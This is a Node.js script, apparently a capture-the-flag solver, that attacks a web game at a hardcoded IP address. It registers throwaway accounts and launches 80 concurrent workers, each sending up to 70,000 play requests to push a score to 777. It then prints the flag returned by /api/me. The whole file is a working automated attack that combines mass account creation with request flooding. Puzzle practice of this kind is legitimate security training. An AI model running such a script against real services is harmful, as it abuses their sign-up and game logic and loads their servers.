const http = require('http');
const BASE = process.argv[2] || 'http://46.225.117.62:30012';
const WORKERS = 80;
const MAX_PLAYS = 70000;

function req(method, path, body, cookie='') {
  return new Promise((resolve, reject) => {
    const data = body ? new URLSearchParams(body).toString() : null;
    const u = new URL(BASE + path);
    const opts = {
      hostname: u.hostname,
      port: u.port,
      path: u.pathname + u.search,
      method,
      headers: {
        ...(data ? {'Content-Type':'application/x-www-form-urlencoded','Content-Length': Buffer.byteLength(data)} : {}),
        ...(cookie ? {Cookie: cookie} : {})
      }
    };
    const r = http.request(opts, (res) => {
      let out='';
      res.on('data', d => out += d.toString());
      res.on('end', () => resolve({status:res.statusCode, headers:res.headers, body:out}));
    });
    r.on('error', reject);
    if (data) r.write(data);
    r.end();
  });
}

async function newUser(i) {
  const username = `rush_${i}_${Math.random().toString(16).slice(2,8)}`;
  const password = 'pw123456';
  await req('POST','/api/register',{username,password});
  const login = await req('POST','/api/login',{username,password});
  const setCookie = login.headers['set-cookie'] || [];
  const tokenCookie = setCookie.find(x => x.startsWith('token='));
  if (!tokenCookie) throw new Error('no token cookie');
  return tokenCookie.split(';')[0];
}

let done = false;

async function worker(i) {
  try {
    const cookie = await newUser(i);
    let score = 0;
    for (let p=1; p<=MAX_PLAYS && !done; p++) {
      const r = await req('POST','/api/play',{action:'cross'},cookie);
      let data = {};
      try { data = JSON.parse(r.body || '{}'); } catch {}
      if (data.status === 'safe') score += (data.gained || 69);
      else score = 0;

      if (score >= 777) {
        const me = await req('GET','/api/me',null,cookie);
        done = true;
        console.log('\n[FLAG_RESPONSE] '+me.body);
        return;
      }

      if (p % 5000 === 0 && !done) process.stdout.write(`w${i}:${p} `);
    }
  } catch (e) {
    if (!done) console.log(`\n[w${i} err] ${e.message}`);
  }
}

(async () => {
  console.log('[*] Target', BASE, 'workers', WORKERS);
  await Promise.all(Array.from({length: WORKERS}, (_,k)=>worker(k+1)));
  if (!done) console.log('\n[-] No flag in this run');
})();
